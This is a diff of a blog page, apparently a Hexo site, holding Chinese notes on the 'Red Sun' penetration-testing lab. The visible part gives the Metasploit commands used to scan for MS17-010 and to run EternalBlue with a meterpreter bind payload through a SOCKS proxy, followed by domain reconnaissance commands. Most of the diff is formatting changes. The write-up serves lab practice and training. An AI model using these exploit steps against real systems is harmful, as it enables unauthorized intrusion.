-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png"></p>
-<p>可以看到有128、130两台机子。</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png" alt="" class="lazyload"></p>
+<p>可以看到有 128、130 两台机子。</p>
 </li>
-<li><p>扫一下ms17-010</p>
+<li>
+<p>扫一下 ms17-010</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> auxiliary/scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>set rhosts <span class="hljs-number">192.168.183.128</span>-<span class="hljs-number">130</span>run<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png"></p>
-<p>可以看到128的win7和130的winserver2008都可能存在永恒之蓝。</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png" alt="" class="lazyload"></p>
+<p>可以看到 128 的 win7 和 130 的 winserver2008 都可能存在永恒之蓝。</p>
 </li>
-<li><p>尝试打永恒之蓝，测试发现128的win7能打通，130的winserver2008打不通。</p>
+<li>
+<p>尝试打永恒之蓝，测试发现 128 的 win7 能打通，130 的 winserver2008 打不通。</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">setg Proxies socks5:<span class="hljs-number">10.0</span>.<span class="hljs-number">5.100</span>:<span class="hljs-number">8888</span>					<span class="hljs-regexp">//</span>MSF走ew的代理set ReverseAllowProxy true							<span class="hljs-regexp">//</span>开启反向代理use exploit<span class="hljs-regexp">/windows/</span>smb<span class="hljs-regexp">/ms17_010_eternalblueset payload windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>bind_tcpset rhost <span class="hljs-number">192.168</span>.<span class="hljs-number">183.128</span>set lport <span class="hljs-number">4444</span>set AutoRunScript post<span class="hljs-regexp">/windows/m</span>anage<span class="hljs-regexp">/migrate       /</span><span class="hljs-regexp">/自动迁移进程run</span><br></code></pre></td></tr></table></figure>
-
-<p>成功拿下shell</p>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png"></p>
+<p>成功拿下 shell</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png" alt="" class="lazyload"></p>
 </li>
 </ol>
-<h3 id="Win7权限维持"><a href="#Win7权限维持" class="headerlink" title="Win7权限维持"></a>Win7权限维持</h3><ol>
-<li>虽然拿到了shell，但是在使用过程中发现这个shell经常掉线，只能想办法弄个稳定点的shell</li>
+<h3 id="win7权限维持"><a class="markdownIt-Anchor" href="#win7权限维持">#</a> Win7 权限维持</h3>
+<ol>
+<li>虽然拿到了 shell，但是在使用过程中发现这个 shell 经常掉线，只能想办法弄个稳定点的 shell</li>
 <li></li>
 </ol>
-<h3 id="Win7信息收集"><a href="#Win7信息收集" class="headerlink" title="Win7信息收集"></a>Win7信息收集</h3><ol>
+<h3 id="win7信息收集"><a class="markdownIt-Anchor" href="#win7信息收集">#</a> Win7 信息收集</h3>
+<ol>
 <li><code>route print</code></li>
 </ol>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737582.png"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737582.png" alt="" class="lazyload"></p>
 <ol start="2">
 <li><code>net user /domain</code></li>
 </ol>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png" alt="" class="lazyload"></p>
 <ol start="3">
 <li><code>net user</code></li>
 </ol>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png" alt="" class="lazyload"></p>
 <ol start="4">
 <li><code>net view</code></li>
 </ol>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png" alt="" class="lazyload"></p>
 <ol start="5">
 <li><code>ping WIN-ENS2VR5TR3N</code></li>
 </ol>
-<p><img src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071744532.png"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071744532.png" alt="" class="lazyload"></p>
 
   </article>
 
@@ -387,7 +422,7 @@
                               <button class="mdui-fab catalog" style="overflow:unset;">
                                   <i class="nexmoefont icon-i-catalog"></i>
                                   <div class="nexmoe-toc">
-                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-%E5%9B%9B-%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">红日靶场(四)笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2001%E7%AB%AF%E5%8F%A3Struct2"><span class="toc-number">1.1.1.</span> <span class="toc-text">2001端口Struct2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2002%E7%AB%AF%E5%8F%A3Tomcat"><span class="toc-number">1.1.2.</span> <span class="toc-text">2002端口Tomcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2003%E7%AB%AF%E5%8F%A3phpMyAdmin-4-8-1"><span class="toc-number">1.1.3.</span> <span class="toc-text">2003端口phpMyAdmin 4.8.1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8%EF%BC%882002%E7%AB%AF%E5%8F%A3%E7%9A%84Tomcat%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">Docker逃逸（2002端口的Tomcat）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%9C%A8Docker%E9%87%8C"><span class="toc-number">1.2.1.</span> <span class="toc-text">如何判断是否在Docker里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95DirtyCow%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8"><span class="toc-number">1.2.2.</span> <span class="toc-text">尝试DirtyCow漏洞逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95runC%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-5736%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">尝试runC容器逃逸漏洞（CVE-2019-5736）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="toc-number">1.2.4.</span> <span class="toc-text">尝试特权模式逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%9D%A5%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">尝试写定时任务来反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%86%99-ssh%E5%85%AC%E9%92%A5%E6%9D%A5%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">尝试写.ssh公钥来连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%F0%9F%90%8E"><span class="toc-number">1.3.1.</span> <span class="toc-text">传🐎</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%F0%9F%90%8E"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">MSF🐎</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">1.3.2.</span> <span class="toc-text">代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ew%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">使用ew代理转发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.3.3.</span> <span class="toc-text">Ubuntu信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Win7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.3.4.</span> <span class="toc-text">Win7权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Win7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.3.5.</span> <span class="toc-text">Win7信息收集</span></a></li></ol></li></ol></li></ol>
+                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text"> 红日靶场 (四) 笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text"> 外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2001%E7%AB%AF%E5%8F%A3struct2"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 2001 端口 Struct2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2002%E7%AB%AF%E5%8F%A3tomcat"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2002 端口 Tomcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2003%E7%AB%AF%E5%8F%A3phpmyadmin-481"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 2003 端口 phpMyAdmin 4.8.1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E9%80%83%E9%80%B82002%E7%AB%AF%E5%8F%A3%E7%9A%84tomcat"><span class="toc-number">1.2.</span> <span class="toc-text"> Docker 逃逸（2002 端口的 Tomcat）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%9C%A8docker%E9%87%8C"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 如何判断是否在 Docker 里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95dirtycow%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 尝试 DirtyCow 漏洞逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9Ecve-2019-5736"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 尝试 runC 容器逃逸漏洞（CVE-2019-5736）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 尝试特权模式逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%9D%A5%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.4.1.</span> <span class="toc-text"> 尝试写定时任务来反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%86%99ssh%E5%85%AC%E9%92%A5%E6%9D%A5%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.2.4.2.</span> <span class="toc-text"> 尝试写.ssh 公钥来连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.3.</span> <span class="toc-text"> 内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 传🐎</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#msf"><span class="toc-number">1.3.1.1.</span> <span class="toc-text"> MSF🐎</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ew%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">1.3.2.1.</span> <span class="toc-text"> 使用 ew 代理转发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ubuntu%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.3.3.</span> <span class="toc-text"> Ubuntu 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.3.4.</span> <span class="toc-text"> Win7 权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.3.5.</span> <span class="toc-text"> Win7 信息收集</span></a></li></ol></li></ol></li></ol>
                                   </div>
                               </button>
                           
@@ -419,7 +454,7 @@
 
  
 
-<script async src="/js/app.js?v=1641264462047"></script>
+<script async src="/js/app.js?v=1641264904598"></script>
 
 
 
@@ -437,7 +472,7 @@
 
     <!-- CNZZ Analytics -->
 <div hidden>
-    <script src="//s95.cnzz.com/z_stat.php?id=&lt;1280753295&gt;&web_id=&lt;1280753295&gt;" language="JavaScript"></script>
+    <script src="//s95.cnzz.com/z_stat.php?id=1280753295&web_id=1280753295" language="JavaScript"></script>
 </div>
 
 
@@ -447,7 +482,7 @@
 <script>
     var _hmt = _hmt || [];
     (function() {var hm = document.createElement('script');
-    hm.src = 'https://hm.baidu.com/hm.js?&lt;f254d2c7295bf4323b22dfe1f8760f82&gt;';
+    hm.src = 'https://hm.baidu.com/hm.js?f254d2c7295bf4323b22dfe1f8760f82';
     var s = document.getElementsByTagName('script')[0];
         s.parentNode.insertBefore(hm, s);
     })();
